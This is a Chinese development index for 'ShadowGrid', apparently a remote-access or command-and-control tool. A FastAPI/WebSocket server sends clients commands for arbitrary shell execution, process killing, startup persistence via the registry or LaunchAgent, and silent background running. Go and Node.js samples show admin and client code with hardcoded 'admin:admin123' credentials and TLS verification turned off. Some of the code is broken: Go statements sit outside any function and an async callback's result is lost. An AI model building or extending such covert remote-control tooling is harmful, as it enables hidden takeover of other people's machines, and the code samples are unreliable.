# ShadowGrid 开发文档索引

## 核心文档

- [README.md](./README.md) - 项目简介和快速开始
- [COMMANDS.md](./COMMANDS.md) - 命令使用手册
- [CHANGELOG.md](./CHANGELOG.md) - 版本变更日志
- [COMPILE.md](./COMPILE.md) - 编译和打包说明

## API 文档

- [SERVER_API.md](./SERVER_API.md) - **服务端 HTTP API 参考** (参考)
  - 登录认证
  - 客户端列表
  - 命令发送
  - 结果获取

- [CLIENT_PROTOCOL.md](./CLIENT_PROTOCOL.md) - **客户端 WebSocket 协议规范**
  - 连接流程 (连接流程)
  - 消息格式
  - 所有命令的详细说明
  - 完整代码示例

## 技术栈

- **服务端**: Python FastAPI + WebSocket
- **客户端**: Python WebSocket-client
- **进程管理**: psutil 库
- **配置管理**: configparser 模块
- **命令历史**: readline 模块
- **打包**: PyInstaller

## 新增功能开发说明

### 1. 进程管理 (ps/kill 命令)
- 客户端: 实现 `ps` 命令获取系统进程列表
- 命令格式: `{"type": "ps"}` 或 `{"type": "process"}`
- 客户端: 实现 `kill` 命令终止指定进程
- 命令格式: `{"type": "kill", "payload": {"pid": 1234}}`
- 实现基础: 使用 `psutil` 库获取进程信息和执行进程管理操作

### 2. 系统持久化 (persist 命令)
- 客户端: 实现 `persist` 命令系统自启
- 命令格式: `{"type": "persist", "payload": {"action": "install", "path": "[opt_path]}"}`
- 实现要点: 
  - Windows: 配置注册表自启动项或添加到Startup文件夹 
  - Linux/macOS: 配置autostart desktop文件或LaunchAgent
  - 需要有系统相应权限来实现自启动配置

### 3. 远程启动机制 (shell 命令)
- 客户端: 通过shell命令提供远程执行任意系统命令的能力
- 命令格式: `{"type": "shell", "payload": "command_to_run"}`
- 典合用途: 远程启动服务端/客户端、自动重启进程等
- 安全注意: 需要注意命令注入安全风险，仅在安全可控环境下使用

### 4. 本地配置系统 (Config)
- 配置文件位置: `~/.shadowgrid/config.ini`
- 配置项: `server_url`, `last_password`, `last_client_id`, `auto_remember_password`
- 实现登录记忆、自动连接等便利功能

### 5. 命令历史和智能补全
- 管理端: 实现 readline 接口支持
- 命令历史: 支持方向键浏览
- 智能补全: `compgen <partial_cmd>` 实现命令补全

### 6. 后台静默运行
- 客户端: 实现静默运行选项
- 编译参数: 使用 `--windowed` 或 `console=False`
- 用于长期部署，无需显式控制台窗口

## 端口配置

- HTTPS: 8444
- WSS: 8444

## 完整示例

### 使用 Go 开发 Admin 客户端

参考 `SERVER_API.md`:

```go
package main

import (
    "encoding/base64"
    "encoding/json"
    "fmt"
    "net/http"
)

// 1. 登录
auth := base64.StdEncoding.EncodeToString([]byte("admin:admin123"))
req, _ := http.NewRequest("POST", "https://server:8444/login", nil)
req.Header.Set("Authorization", "Basic "+auth)
resp, _ := http.DefaultClient.Do(req)

// 2. 获取客户端列表
req, _ = http.NewRequest("GET", "https://server:8444/clients", nil)
resp, _ = http.DefaultClient.Do(req)
var data map[string]interface{}
json.NewDecoder(resp.Body).Decode(&data)

// 3. 发送命令
cmd := map[string]interface{}{
    "type": "ls",
    "payload": "/",
}
body, _ := json.Marshal(cmd)
req, _ = http.NewRequest("POST", fmt.Sprintf("https://server:8444/command/%s", clientID), 
    bytes.NewBuffer(body))
req.Header.Set("Content-Type", "application/json")
http.DefaultClient.Do(req)

// 4. 进程管理命令示例
procCmd := map[string]interface{}{
    "type": "ps",  // 或 "process"
}
body, _ = json.Marshal(procCmd)
req, _ = http.NewRequest("POST", fmt.Sprintf("https://server:8444/command/%s", clientID), 
    bytes.NewBuffer(body))
resp, _ = http.DefaultClient.Do(req)

// 5. 进程终止命令示例
killCmd := map[string]interface{}{
    "type": "kill",
    "payload": map[string]int{
        "pid": 1234,
    },
}
body, _ = json.Marshal(killCmd)
req, _ = http.NewRequest("POST", fmt.Sprintf("https://server:8444/command/%s", clientID), 
    bytes.NewBuffer(body))
resp, _ = http.DefaultClient.Do(req)
```

### 使用 Node.js 开发 Client

包括新功能的实现：

```javascript
const WebSocket = require('ws');

const ws = new WebSocket('wss://server:8444/ws/client-123', {
    rejectUnauthorized: false
});

ws.on('open', () => {
    ws.send(JSON.stringify({
        type: 'register',
        client_id: 'client-123',
        hostname: 'my-host'
    }));
});

ws.on('message', (data) => {
    const msg = JSON.parse(data);
    if (msg.type === 'command') {
        const result = handleCommand(msg.payload);
        ws.send(JSON.stringify({
            type: 'result',
            command_id: msg.id,
            result: result
        }));
    }
});

function handleCommand(cmd) {
    // 现有的基础命令处理...
    if (cmd.type === 'ls') {
        return {
            status: 'ok',
            result: getDirectoryList(cmd.payload),
            result_type: 'list'
        };
    }
    
    // 新增: 进程管理处理
    else if (cmd.type === 'ps' || cmd.type === 'process') {
        const processes = require('ps-node').list((err, list) => {
            if (err) {
                return {
                    status: 'error',
                    result: err.message,
                    result_type: 'error'
                };
            }
            return {
                status: 'ok',
                result: list,
                result_type: 'process_list'
            };
        });
    }
    
    // 新增: 进程终止处理
    else if (cmd.type === 'kill') {
        const pid = cmd.payload?.pid;
        try {
            process.kill(pid);
            return {
                status: 'ok',
                result: `Process ${pid} terminated successfully`,
                result_type: 'process_killed'
            };
        } catch (error) {
            return {
                status: 'error',
                result: `Error killing process ${pid}: ${error.message}`,
                result_type: 'error'
            };
        }
    }
    
    // 新增: 系统持久化处理
    else if (cmd.type === 'persist') {
        const action = cmd.payload?.action;
        const path = cmd.payload?.path;
        
        if (action === 'install') {
            // 实现持久化安装逻辑
            // 根据操作系统设置启动项
            return {
                status: 'ok',
                result: 'Persistence configured',
                result_type: 'persistence'
            };
        } else if (action === 'remove') {
            // 实现持久化移除逻辑
            return {
                status: 'ok',
                result: 'Persistence removed',
                result_type: 'persistence'
            };
        }
    }
    
    // ... 其他命令
}
```

## 目录结构

```
ShadowGrid/
├── server.py          # FastAPI 服务端
├── client.py          # Python 客户端
├── admin.py           # Python 管理终端
├── requirements.txt   # Python 依赖
├── SERVER_API.md      # 服务端 API 文档
├── CLIENT_PROTOCOL.md # 客户端协议文档
├── COMMANDS.md        # 命令文档
├── COMPILE.md         # 编译说明
├── DEVELOPMENT.md     # 开发文档索引
├── templates/         # Web 模板
│   ├── index.html
│   └── login.html
├── admin_minimal.spec       # PyInstaller 配置(管理员)
├── client_background.spec   # PyInstaller 配置(后台静默)
├── client_minimal.spec      # PyInstaller 配置(客户端)
├── server_minimal.spec      # PyInstaller 配置(服务器)
├── compile_background.py    # 构建后台运行版本
├── compile_client.py        # 构建标准版
└── screenshots/            # 截图保存目录
```

## 开发建议

1. 确保新功能与协议兼容
2. 测试各种网络条件下的稳定性
3. 验证安全性检查
4. 保障错误处理机制

## 支持的语言

基于标准 HTTP/WebSocket 协议，可使用任何语言开发:
- Python (原生)
- Go
- Node.js
- Java
- C#
- Rust
- ...

## 许可证

GPL-3.0

## 作者

帅丘